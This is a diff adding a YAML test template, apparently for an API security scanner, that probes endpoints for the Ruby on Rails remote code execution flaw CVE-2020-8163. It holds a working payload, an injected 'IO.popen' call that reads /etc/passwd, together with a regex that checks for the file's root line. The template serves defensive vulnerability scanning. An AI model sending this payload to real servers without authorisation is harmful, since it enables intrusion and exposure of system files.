@@ -1,0 +1,60 @@
+id: RUBY_RAILS_RCE
+info:
+  name: "Ruby on Rails Remote Code Execution"
+  description: "This vulnerability allows an attacker to execute arbitrary code on a vulnerable server by exploiting flaws in the framework's handling of user inputs. This can occur through various vectors, such as unsafe deserialization or improper sanitization of parameters. If successfully exploited, the attacker can gain complete control over the affected application, potentially leading to data theft, unauthorized access, or complete system compromise. Prompt patching and secure coding practices are essential to mitigate this risk."
+  details: "The Ruby on Rails RCE vulnerability primarily affects applications that process untrusted user input without proper validation. Specific versions may be impacted by certain functions that inadvertently allow code execution. Attackers can leverage this vulnerability to craft malicious payloads that exploit weaknesses in the framework, gaining unauthorized access to the server environment. Regular updates and security reviews are crucial to protecting against such threats."
+  impact: "Successful exploitation of the Ruby on Rails remote code execution vulnerability can lead to severe consequences, including unauthorized access to the server and sensitive data. Attackers may execute arbitrary code, potentially allowing them to modify or delete files, deploy malware, or compromise the entire application environment. This could result in data breaches, loss of integrity, and significant reputational damage to the affected organization. Proper mitigation and timely updates are essential to minimize these risks."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: RUBY_RAILS_RCE
+  severity: CRITICAL
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2020-8163
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    regex: "root:.*:0:0:"
+    not_contains:
+      - <html>
+      - </html>
+    length:
+      gt: 0
